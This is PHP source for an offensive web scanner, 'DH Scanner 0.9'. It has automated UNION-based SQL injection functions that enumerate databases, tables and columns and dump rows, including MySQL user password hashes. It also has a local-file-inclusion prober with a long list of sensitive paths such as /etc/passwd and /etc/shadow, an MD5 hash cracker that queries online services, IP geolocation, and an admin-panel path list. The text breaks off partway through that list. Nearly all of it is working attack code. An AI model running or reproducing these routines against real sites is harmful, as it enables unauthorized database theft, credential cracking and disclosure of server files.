<?php

// DH Scanner 0.9
// (C) Doddy Hackman 2015

error_reporting(0);

// Login

$username = "admin"; // Edit
$password = "21232f297a57a5a743894a0e4a801fc3"; // Edit

// Functions

function sql_dumper($target, $tabla, $columna1, $columna2)
{
    
    $resultado = "";
    
    $resultado = $resultado . "[+] Fuzzing values ...\n";
    $url1      = $target;
    $url2      = $target;
    $url1      = str_replace("hackman", "unhex(hex(concat(char(69,82,84,79,82,56,53,52),count(" . $columna1 . "),char(69,82,84,79,82,56,53,52))))", $url1);
    $url2      = str_replace("hackman", "unhex(hex(concat(char(69,82,84,79,82,56,53,52)," . $columna1 . ",char(69,82,84,79,82,56,53,52)," . $columna2 . ",char(69,82,84,79,82,56,53,52))))", $url2);
    $code      = toma($url1 . "+from+" . $tabla . "--");
    if (preg_match("/ERTOR854(.*)ERTOR854/i", $code)) {
        preg_match_all("/ERTOR854(.*)ERTOR854/i", $code, $re);
        $reco      = $re[1][0];
        $resultado = $resultado . "\n[+] Values Found : " . htmlentities($reco) . "\n";
        for ($i = 0; $i <= $reco; $i++) {
            $code = toma($url2 . "+from+" . $tabla . "+limit+" . $i . ",1--");
            if (preg_match("/ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code)) {
                preg_match_all("/ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code, $re);
                $resultado = $resultado . "\n[+] " . htmlentities($columna1) . " : " . htmlentities($re[1][0]);
                $resultado = $resultado . "\n[+] " . htmlentities($columna2) . " : " . htmlentities($re[2][0]);
            }
        }
    } else {
        $resultado = $resultado . "\n[-] Not Found";
    }
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function sql_mysql($target)
{
    
    $resultado = "";
    
    $resultado = $resultado . "[+] Fuzzing mysql.user ...\n";
    $url1      = $target;
    $url2      = $target;
    $url1      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2      = str_replace("hackman", "unhex(hex(concat(0x524154535850444f574e,Host,0x524154535850444f574e,User,0x524154535850444f574e,Password,0x524154535850444f574e)))", $url2);
    $code      = toma($url1 . "+from+mysql.user--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco      = $re[1][0];
        $resultado = $resultado . "\n[+] Values Found : " . htmlentities($reco) . "\n";
        for ($i = 0; $i <= $reco; $i++) {
            $code = toma($url2 . "+from+mysql.user+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/i", $code)) {
                preg_match_all("/RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN(.*)RATSXPDOWN/i", $code, $re);
                $resultado = $resultado . "\n[+] Host : " . htmlentities($re[1][0]);
                $resultado = $resultado . "\n[+] Username : " . htmlentities($re[2][0]);
                $resultado = $resultado . "\n[+] Password : " . htmlentities($re[3][0]);
            }
        }
    } else {
        $resultado = $resultado . "\n[-] Not Found";
    }
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function sql_db_columns($target, $db, $table)
{
    
    $resultado = "";
    
    $resultado = $resultado . "[+] Fuzzing columns ...\n";
    $url1      = $target;
    $url2      = $target;
    $url1      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code      = toma($url1 . "+from+information_schema.columns+where+table_name=" . hex($table) . "+and+table_schema=" . hex($db) . "--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco      = $re[1][0];
        $resultado = $resultado . "\n[+] Columns Found : " . htmlentities($reco) . "\n";
        for ($i = 0; $i <= $reco; $i++) {
            $code = toma($url2 . "+from+information_schema.columns+where+table_name=" . hex($table) . "+and+table_schema=" . hex($db) . "+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                $resultado = $resultado . "\n[+] Column : " . htmlentities($re[1][0]);
            }
        }
    } else {
        $resultado = $resultado . "\n[-] Not Found";
    }
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function sql_db_tables($target, $db)
{
    $resultado = "";
    
    $resultado = $resultado . "[+] Fuzzing tables ...\n";
    $url1      = $target;
    $url2      = $target;
    $url1      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code      = toma($url2 . "+from+information_schema.tables+where+table_schema=" . hex($db) . "--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco      = $re[1][0];
        $resultado = $resultado . "\n[+] Tables Found : " . htmlentities($reco) . "\n";
        for ($i = 0; $i <= $reco; $i++) {
            $code = toma($url1 . "+from+information_schema.tables+where+table_schema=" . hex($db) . "+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                $resultado = $resultado . "\n[+] Table : " . htmlentities($re[1][0]);
            }
        }
    } else {
        $resultado = $resultado . "\n[-] Not Found";
    }
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function sql_dbs($target)
{
    $resultado = "";
    
    $resultado = $resultado . "[+] Fuzzing DBS ...\n";
    $url1      = $target;
    $url2      = $target;
    $url1      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),schema_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code      = toma($url1 . "+from+information_schema.schemata--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco      = $re[1][0];
        $resultado = $resultado . "\n[+] DBS Found : " . htmlentities($reco) . "\n";
        for ($i = 0; $i <= $reco; $i++) {
            $code = toma($url2 . "+from+information_schema.schemata+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                $resultado = $resultado . "\n[+] DB : " . htmlentities($re[1][0]);
            }
        }
    } else {
        $resultado = $resultado . "\n[-] Not Found";
    }
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function sql_columns($target, $table)
{
    
    $resultado = "";
    
    $resultado = $resultado . "[+] Fuzzing columns ...\n";
    $url1      = $target;
    $url2      = $target;
    $url1      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),column_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code      = toma($url1 . "+from+information_schema.columns+where+table_name=" . hex($table) . "--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco      = $re[1][0];
        $resultado = $resultado . "\n[+] Columns Found : " . htmlentities($reco) . "\n";
        for ($i = 0; $i <= $reco; $i++) {
            $code = toma($url2 . "+from+information_schema.columns+where+table_name=" . hex($table) . "+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                $resultado = $resultado . "\n[+] Column : " . htmlentities($re[1][0]);
            }
        }
    } else {
        $resultado = $resultado . "\n[-] Not Found";
    }
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function sql_tables($target)
{
    $resultado = "";
    
    $resultado = $resultado . "[+] Fuzzing tables ...\n";
    $url1      = $target;
    $url2      = $target;
    $url1      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),table_name,char(82,65,84,83,88,80,68,79,87,78,49))))", $url1);
    $url2      = str_replace("hackman", "unhex(hex(concat(char(82,65,84,83,88,80,68,79,87,78,49),Count(*),char(82,65,84,83,88,80,68,79,87,78,49))))", $url2);
    $code      = toma($url2 . "+from+information_schema.tables--");
    if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
        preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
        $reco      = $re[1][0];
        $resultado = $resultado . "\n[+] Tables Found : " . htmlentities($reco) . "\n";
        for ($i = 17; $i <= $reco; $i++) {
            $code = toma($url1 . "+from+information_schema.tables+limit+" . $i . ",1--");
            if (preg_match("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code)) {
                preg_match_all("/RATSXPDOWN1(.*)RATSXPDOWN1/i", $code, $re);
                $resultado = $resultado . "\n[+] Table : " . htmlentities($re[1][0]);
            }
        }
    } else {
        $resultado = $resultado . "\n\n[-] Not Found";
    }
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function sqlscan($target)
{
    $resultado = "";
    
    $resultado = $resultado . "[+] Scanning ...\n";
    $code      = toma($target . "-1+union+select+1--");
    if (preg_match("/The used SELECT statements have a different number of columns/i", $code)) {
        $resultado = $resultado . "\n[+] Searching count of the columns ...";
        $sqli      = "concat(0x646F6464796861636B6D616E,1,0x646F6464796861636B6D616E)";
        for ($i = 2; $i <= 70; $i++) {
            $sqli .= ",concat(0x646F6464796861636B6D616E,$i,0x646F6464796861636B6D616E)";
            $code = toma($target . "-1+union+select+" . $sqli . "--");
            if (preg_match("/doddyhackman(.*)doddyhackman/i", $code)) {
                $sac       = preg_match("/doddyhackman(.*)doddyhackman/i", $code);
                $resultado = $resultado . "\n[+] Rows Length : " . htmlentities($i);
                $sql       = "1";
                for ($n = 2; $n <= $i; $n++) {
                    $sql .= ",$n";
                }
                $sqla      = str_replace($sac, "hackman", $sql);
                $resultado = $resultado . "\n[+] SQLI : " . htmlentities($target) . "-1+union+select+" . htmlentities($sqla) . "--";
                $resultado = $resultado . "\n[+] The number " . htmlentities($sac) . " print data";
                $data_sql  = "unhex(hex(concat(char(69,82,84,79,82,56,53,52),version(),char(69,82,84,79,82,56,53,52),database(),char(69,82,84,79,82,56,53,52),user(),char(69,82,84,79,82,56,53,52))))";
                $sqlaa     = str_replace("hackman", $data_sql, $sqla);
                
                $resultado = $resultado . "\n\n[+] Getting DB Information ...\n";
                
                $code = toma($target . "-1+union+select+" . $sqlaa);
                if (preg_match("/ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code)) {
                    preg_match_all("/ERTOR854(.*)ERTOR854(.*)ERTOR854(.*)ERTOR854/i", $code, $re);
                    $resultado = $resultado . "\n[+] DB Version : " . htmlentities($re[1][0]);
                    $resultado = $resultado . "\n[+] DB Name : " . htmlentities($re[2][0]);
                    $resultado = $resultado . "\n[+] DB Username : " . htmlentities($re[3][0]);
                }
                $resultado = $resultado . "\n\n[+] Finished";
                return $resultado;
                break;
            }
        }
    }
    $resultado = $resultado . "\n[-] Not Vulnerable";
    
    return $resultado;
}
function lfiscan($target)
{
    $files = array(
        'C:/xampp/htdocs/aca.txt',
        'C:/xampp/htdocs/aca.txt',
        'C:/xampp/htdocs/admin.php',
        'C:/xampp/htdocs/leer.txt',
        '../../../boot.ini',
        '../../../../boot.ini',
        '../../../../../boot.ini',
        '../../../../../../boot.ini',
        '/etc/passwd',
        '/etc/shadow',
        '/etc/shadow~',
        '/etc/hosts',
        '/etc/motd',
        '/etc/apache/apache.conf',
        '/etc/fstab',
        '/etc/apache2/apache2.conf',
        '/etc/apache/httpd.conf',
        '/etc/httpd/conf/httpd.conf',
        '/etc/apache2/httpd.conf',
        '/etc/apache2/sites-available/default',
        '/etc/mysql/my.cnf',
        '/etc/my.cnf',
        '/etc/sysconfig/network-scripts/ifcfg-eth0',
        '/etc/redhat-release',
        '/etc/httpd/conf.d/php.conf',
        '/etc/pam.d/proftpd',
        '/etc/phpmyadmin/config.inc.php',
        '/var/www/config.php',
        '/etc/httpd/logs/error_log',
        '/etc/httpd/logs/error.log',
        '/etc/httpd/logs/access_log',
        '/etc/httpd/logs/access.log',
        '/var/log/apache/error_log',
        '/var/log/apache/error.log',
        '/var/log/apache/access_log',
        '/var/log/apache/access.log',
        '/var/log/apache2/error_log',
        '/var/log/apache2/error.log',
        '/var/log/apache2/access_log',
        '/var/log/apache2/access.log',
        '/var/www/logs/error_log',
        '/var/www/logs/error.log',
        '/var/www/logs/access_log',
        '/var/www/logs/access.log',
        '/usr/local/apache/logs/error_log',
        '/usr/local/apache/logs/error.log',
        '/usr/local/apache/logs/access_log',
        '/usr/local/apache/logs/access.log',
        '/var/log/error_log',
        '/var/log/error.log',
        '/var/log/access_log',
        '/var/log/access.log',
        '/etc/group',
        '/etc/security/group',
        '/etc/security/passwd',
        '/etc/security/user',
        '/etc/security/environ',
        '/etc/security/limits',
        '/usr/lib/security/mkuser.default',
        '/apache/logs/access.log',
        '/apache/logs/error.log',
        '/etc/httpd/logs/acces_log',
        '/etc/httpd/logs/acces.log',
        '/var/log/httpd/access_log',
        '/var/log/httpd/error_log',
        '/apache2/logs/error.log',
        '/apache2/logs/access.log',
        '/logs/error.log',
        '/logs/access.log',
        '/usr/local/apache2/logs/access_log',
        '/usr/local/apache2/logs/access.log',
        '/usr/local/apache2/logs/error_log',
        '/usr/local/apache2/logs/error.log',
        '/var/log/httpd/access.log',
        '/var/log/httpd/error.log',
        '/opt/lampp/logs/access_log',
        '/opt/lampp/logs/error_log',
        '/opt/xampp/logs/access_log',
        '/opt/xampp/logs/error_log',
        '/opt/lampp/logs/access.log',
        '/opt/lampp/logs/error.log',
        '/opt/xampp/logs/access.log',
        '/opt/xampp/logs/error.log',
        'C:\ProgramFiles\ApacheGroup\Apache\logs\access.log',
        'C:\ProgramFiles\ApacheGroup\Apache\logs\error.log',
        '/usr/local/apache/conf/httpd.conf',
        '/usr/local/apache2/conf/httpd.conf',
        '/etc/apache/conf/httpd.conf',
        '/usr/local/etc/apache/conf/httpd.conf',
        
        '/usr/local/apache/httpd.conf',
        '/usr/local/apache2/httpd.conf',
        '/usr/local/httpd/conf/httpd.conf',
        '/usr/local/etc/apache2/conf/httpd.conf',
        '/usr/local/etc/httpd/conf/httpd.conf',
        '/usr/apache2/conf/httpd.conf',
        '/usr/apache/conf/httpd.conf',
        '/usr/local/apps/apache2/conf/httpd.conf',
        '/usr/local/apps/apache/conf/httpd.conf',
        '/etc/apache2/conf/httpd.conf',
        '/etc/http/conf/httpd.conf',
        '/etc/httpd/httpd.conf',
        '/etc/http/httpd.conf',
        '/etc/httpd.conf',
        '/opt/apache/conf/httpd.conf',
        '/opt/apache2/conf/httpd.conf',
        '/var/www/conf/httpd.conf',
        '/private/etc/httpd/httpd.conf',
        '/private/etc/httpd/httpd.conf.default',
        '/Volumes/webBackup/opt/apache2/conf/httpd.conf',
        '/Volumes/webBackup/private/etc/httpd/httpd.conf',
        '/Volumes/webBackup/private/etc/httpd/httpd.conf.default',
        'C:\ProgramFiles\ApacheGroup\Apache\conf\httpd.conf',
        'C:\ProgramFiles\ApacheGroup\Apache2\conf\httpd.conf',
        'C:\ProgramFiles\xampp\apache\conf\httpd.conf',
        '/usr/local/php/httpd.conf.php',
        '/usr/local/php4/httpd.conf.php',
        '/usr/local/php5/httpd.conf.php',
        '/usr/local/php/httpd.conf',
        '/usr/local/php4/httpd.conf',
        '/usr/local/php5/httpd.conf',
        '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
        '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf',
        '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf',
        '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php',
        '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php',
        '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php',
        '/usr/local/etc/apache/vhosts.conf',
        '/etc/php.ini',
        '/bin/php.ini',
        '/etc/httpd/php.ini',
        '/usr/lib/php.ini',
        '/usr/lib/php/php.ini',
        '/usr/local/etc/php.ini',
        '/usr/local/lib/php.ini',
        '/usr/local/php/lib/php.ini',
        '/usr/local/php4/lib/php.ini',
        '/usr/local/php5/lib/php.ini',
        '/usr/local/apache/conf/php.ini',
        '/etc/php4.4/fcgi/php.ini',
        '/etc/php4/apache/php.ini',
        '/etc/php4/apache2/php.ini',
        '/etc/php5/apache/php.ini',
        '/etc/php5/apache2/php.ini',
        '/etc/php/php.ini',
        '/etc/php/php4/php.ini',
        '/etc/php/apache/php.ini',
        '/etc/php/apache2/php.ini',
        '/web/conf/php.ini',
        '/usr/local/Zend/etc/php.ini',
        '/opt/xampp/etc/php.ini',
        '/var/local/www/conf/php.ini',
        '/etc/php/cgi/php.ini',
        '/etc/php4/cgi/php.ini',
        '/etc/php5/cgi/php.ini',
        'c:\php5\php.ini',
        'c:\php4\php.ini',
        'c:\php\php.ini',
        'c:\PHP\php.ini',
        'c:\WINDOWS\php.ini',
        'c:\WINNT\php.ini',
        'c:\apache\php\php.ini',
        'c:\xampp\apache\bin\php.ini',
        'c:\NetServer\bin\stable\apache\php.ini',
        'c:\home2\bin\stable\apache\php.ini',
        'c:\home\bin\stable\apache\php.ini',
        '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini',
        '/usr/local/cpanel/logs',
        '/usr/local/cpanel/logs/stats_log',
        '/usr/local/cpanel/logs/access_log',
        '/usr/local/cpanel/logs/error_log',
        '/usr/local/cpanel/logs/license_log',
        '/usr/local/cpanel/logs/login_log',
        '/var/cpanel/cpanel.config',
        '/var/log/mysql/mysql-bin.log',
        '/var/log/mysql.log',
        '/var/log/mysqlderror.log',
        '/var/log/mysql/mysql.log',
        '/var/log/mysql/mysql-slow.log',
        '/var/mysql.log',
        '/var/lib/mysql/my.cnf',
        'C:\ProgramFiles\MySQL\MySQLServer5.0\data\hostname.err',
        'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.log',
        'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql.err',
        'C:\ProgramFiles\MySQL\MySQLServer5.0\data\mysql-bin.log',
        'C:\ProgramFiles\MySQL\data\hostname.err',
        'C:\ProgramFiles\MySQL\data\mysql.log',
        'C:\ProgramFiles\MySQL\data\mysql.err',
        'C:\ProgramFiles\MySQL\data\mysql-bin.log',
        'C:\MySQL\data\hostname.err',
        'C:\MySQL\data\mysql.log',
        'C:\MySQL\data\mysql.err',
        'C:\MySQL\data\mysql-bin.log',
        'C:\ProgramFiles\MySQL\MySQLServer5.0\my.ini',
        'C:\ProgramFiles\MySQL\MySQLServer5.0\my.cnf',
        'C:\ProgramFiles\MySQL\my.ini',
        'C:\ProgramFiles\MySQL\my.cnf',
        'C:\MySQL\my.ini',
        'C:\MySQL\my.cnf',
        '/etc/logrotate.d/proftpd',
        '/www/logs/proftpd.system.log',
        '/var/log/proftpd',
        '/etc/proftp.conf',
        '/etc/protpd/proftpd.conf',
        '/etc/vhcs2/proftpd/proftpd.conf',
        '/etc/proftpd/modules.conf',
        '/var/log/vsftpd.log',
        '/etc/vsftpd.chroot_list',
        '/etc/logrotate.d/vsftpd.log',
        '/etc/vsftpd/vsftpd.conf',
        '/etc/vsftpd.conf',
        '/etc/chrootUsers',
        '/var/log/xferlog',
        '/var/adm/log/xferlog',
        '/etc/wu-ftpd/ftpaccess',
        '/etc/wu-ftpd/ftphosts',
        '/etc/wu-ftpd/ftpusers',
        '/usr/sbin/pure-config.pl',
        '/usr/etc/pure-ftpd.conf',
        '/etc/pure-ftpd/pure-ftpd.conf',
        '/usr/local/etc/pure-ftpd.conf',
        '/usr/local/etc/pureftpd.pdb',
        '/usr/local/pureftpd/etc/pureftpd.pdb',
        '/usr/local/pureftpd/sbin/pure-config.pl',
        '/usr/local/pureftpd/etc/pure-ftpd.conf',
        '/etc/pure-ftpd/pure-ftpd.pdb',
        '/etc/pureftpd.pdb',
        '/etc/pureftpd.passwd',
        '/etc/pure-ftpd/pureftpd.pdb',
        '/var/log/pure-ftpd/pure-ftpd.log',
        '/logs/pure-ftpd.log',
        '/var/log/pureftpd.log',
        '/var/log/ftp-proxy/ftp-proxy.log',
        '/var/log/ftp-proxy',
        '/var/log/ftplog',
        '/etc/logrotate.d/ftp',
        '/etc/ftpchroot',
        '/etc/ftphosts',
        '/var/log/exim_mainlog',
        '/var/log/exim/mainlog',
        '/var/log/maillog',
        '/var/log/exim_paniclog',
        '/var/log/exim/paniclog',
        '/var/log/exim/rejectlog',
        '/var/log/exim_rejectlog'
    );
    
    $resultado = "";
    
    $resultado = $resultado . "[+] Scanning ...\n";
    
    $code      = toma($target . "'");
    $check_lfi = "0";
    if (preg_match("/No such file or directory in <b>(.*)<\/b> on line/i", $code)) {
        preg_match_all("/No such file or directory in <b>(.*)<\/b> on line/i", $code, $re);
        $resultado = $resultado . "\n[+] Full Path Discloure : " . htmlentities($re[1][0]);
        $check_lfi = "1";
    } elseif (preg_match("/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/i", $code)) {
        preg_match_all("/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/i", $code, $re);
        $resultado = $resultado . "\n[+] Full Path Discloure : " . htmlentities($re[1][0]);
        $check_lfi = "1";
    } else {
        $resultado = $resultado . "\n[-] Not Vulnerable";
        $check_lfi = "0";
    }
    if ($check_lfi == 1) {
        $resultado = $resultado . "\n\n[+] Searching files ...\n";
        foreach ($files as $file) {
            $code = toma($target . $file);
            if (preg_match("/No such file or directory in <b>(.*)<\/b> on line/i", $code) or preg_match("/No existe el fichero o el directorio in <b>(.*?)<\/b> on line/i", $code)) {
            } else {
                $resultado = $resultado . "\n[+] : " . htmlentities($target) . htmlentities($file);
            }
        }
    }
    
    $resultado = $resultado . "\n\n[+] Finished";
    
    return $resultado;
}
function crackmd5($hash)
{
    $resultado = "";
    
    $resultado   = $resultado . "\n[+] " . $hash . " : ";
    $code        = tomar("http://www.md5.net/cracker.php", "hash=" . $hash . "&submit=Crack");
    $check_error = "0";
    if (preg_match("/<input type=\"text\" id=\"hash\" size=\"(.*?)\" value=\"(.*?)\"/i", $code)) {
        preg_match_all("/<input type=\"text\" id=\"hash\" size=\"(.*?)\" value=\"(.*?)\"/i", $code, $re);
        if (preg_match("/Entry not found/", $re[2][0])) {
            $check_error = "1";
        } else {
            $resultado   = $resultado . htmlentities($re[2][0]);
            $check_error = "0";
        }
    } else {
        $check_error = "1";
    }
    if ($check_error == 1) {
        $code = tomar("http://md5online.net/index.php", "pass=" . $hash . "&option=hash2text&send=Submit");
        if (preg_match("/<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>/i", $code)) {
            preg_match_all("/<center><p>md5 :<b>(.*?)<\/b> <br>pass : <b>(.*?)<\/b><\/p>/i", $code, $re);
            $resultado = $resultado . htmlentities($re[2][0]);
        } else {
            $code = tomar("http://md5decryption.com/index.php", "hash=" . $hash . "&submit=Decrypt It!");
            if (preg_match("/Decrypted Text: <\/b>(.*?)<\/font>/i", $code)) {
                preg_match_all("/Decrypted Text: <\/b>(.*?)<\/font>/i", $code, $re);
                $resultado = $resultado . htmlentities($re[1][0]);
            } else {
                $code = tomar("http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php", "md5=" . $hash);
                if (preg_match("/<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>/i", $code)) {
                    preg_match_all("/<span class='middle_title'>Hashed string<\/span>: (.*?)<\/div>/i", $code, $re);
                    $resultado = $resultado . htmlentities($re[1][0]);
                } else {
                    $resultado = $resultado . "Not Found";
                }
            }
        }
        
    }
    
    return $resultado;
}
function locateip($target)
{
    
    $resultado = "";
    
    $dame_host = parse_url($target);
    $hostname  = $dame_host['host'];
    $ip        = gethostbyname($hostname);
    $resultado = $resultado . "[+] Searching ...\n";
    $code      = tomar("http://www.melissadata.com/lookups/iplocation.asp?ipaddress=", "ipaddress=" . $ip . "&Submit=submit");
    if (preg_match("/City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code)) {
        preg_match_all("/City<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code, $re);
        $resultado = $resultado . "\n[+] City : " . htmlentities($re[2][0]);
    } else {
        $resultado = $resultado . "\n[+] City : Not Found";
    }
    if (preg_match("/Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code)) {
        preg_match_all("/Country<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code, $re);
        $resultado = $resultado . "\n[+] Country : " . htmlentities($re[2][0]);
    } else {
        $resultado = $resultado . "\n[+] Country : Not Found";
    }
    if (preg_match("/State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code)) {
        preg_match_all("/State or Region<\/td><td align=(.*)><b>(.*)<\/b><\/td>/i", $code, $re);
        $resultado = $resultado . "\n[+] State or Region : " . htmlentities($re[2][0]);
    } else {
        $resultado = $resultado . "\n[+] State or Region : Not Found";
    }
    $resultado = $resultado . "\n\n[+] Getting DNS ...\n";
    $code      = toma("http://www.ip-adress.com/reverse_ip/" . $ip);
    if (preg_match("/whois\/(.*?)\">Whois/i", $code)) {
        preg_match_all("/whois\/(.*?)\">Whois/i", $code, $re);
        $matches = $re[1];
        foreach ($matches as $valor) {
            if ($valor != "") {
                $resultado = $resultado . "\n[+] DNS Found : " . $valor;
            }
        }
    }
    $resultado = $resultado . "\n\n[+] Finished";
    return $resultado;
}
function paneladmin($target)
{
    $panels = array(
        'admin/admin.asp',
        'admin/login.asp',
        'admin/index.asp',
        'admin/admin.aspx',
        'admin/login.aspx',
        'admin/index.aspx',
        'admin/webmaster.asp',
        'admin/webmaster.aspx',
        'asp/admin/index.asp',
        'asp/admin/index.aspx',
        'asp/admin/admin.asp',
        'asp/admin/admin.aspx',
        'asp/admin/webmaster.asp',
        'asp/admin/webmaster.aspx',
        'admin/',
        'login.asp',
        'login.aspx',
        'admin.asp',
        'admin.aspx',
        'webmaster.aspx',
        'webmaster.asp',
        'login/index.asp',
        'login/index.aspx',
        'login/login.asp',
        'login/login.aspx',
        'login/admin.asp',
        'login/admin.aspx',
        'administracion/index.asp',
        'administracion/index.aspx',
        'administracion/login.asp',
        'administracion/login.aspx',
        'administracion/webmaster.asp',
        'administracion/webmaster.aspx',
        'administracion/admin.asp',
        'administracion/admin.aspx',
        'php/admin/',
        'admin/admin.php',
        'admin/index.php',
        'admin/login.php',
        'admin/system.php',
        'admin/ingresar.php',
        'admin/administrador.php',
        'admin/default.php',
        'administracion/',
        'administracion/index.php',
        'administracion/login.php',
        'administracion/ingresar.php',
        'administracion/admin.php',
        'administration/',
        'administration/index.php',
        'administration/login.php',
        'administrator/index.php',
        'administrator/login.php',
        'administrator/system.php',
        'system/',
        'system/login.php',
        'admin.php',
        'login.php',
        'administrador.php',
        'administration.php',
        'administrator.php',
        'admin1.html',
        'admin1.php',
        'admin2.php',
        'admin2.html',
        'yonetim.php',
        'yonetim.html',
        'yonetici.php',
        'yonetici.html',
        'adm/',
        'admin/account.php',
        'admin/account.html',
        'admin/index.html',
        'admin/login.html',
        'admin/home.php',
        'admin/controlpanel.html',
        'admin/controlpanel.php',
        'admin.html',
        'admin/cp.php',
        'admin/cp.html',
        'cp.php',
        'cp.html',
        'administrator/',
        'administrator/index.html',
        'administrator/login.html',
        'administrator/account.html',
        'administrator/account.php',
        'administrator.html',
        'login.html',
        'modelsearch/login.php',
        'moderator.php',
        'moderator.html',
        'moderator/login.php',
        'moderator/login.html',
        'moderator/admin.php',
        'moderator/admin.html',
        'moderator/',
        'account.php',
        'account.html',
        'controlpanel/',
        'controlpanel.php',
        'controlpanel.html',
        'admincontrol.php',
        'admincontrol.html',
        'adminpanel.php',
        'adminpanel.html',
        'admin1.asp',
        'admin2.asp',
        'yonetim.asp',
        'yonetici.asp',
        'admin/account.asp',
        'admin/home.asp',
        'admin/controlpanel.asp',
        'admin/cp.asp',
        'cp.asp',
        'administrator/index.asp',
        'administrator/login.asp',
        'administrator/account.asp',
        'administrator.asp',
        'modelsearch/login.asp',
        'moderator.asp',
        'moderator/login.asp',
        'moderator/admin.asp',
        'account.asp',
        'controlpanel.asp',
        'admincontrol.asp',
        'adminpanel.asp',
        'fileadmin/',
        'fileadmin.php',
        'fileadmin.asp',
        'fileadmin.html',
        'administration.html',
        'sysadmin.php',
        'sysadmin.html',
        'phpmyadmin/',
        'myadmin/',
        'sysadmin.asp',
        'sysadmin/',
        'ur-admin.asp',
        'ur-admin.php',
        'ur-admin.html',
        'ur-admin/',
        'Server.php',
        'Server.html',
        'Server.asp',
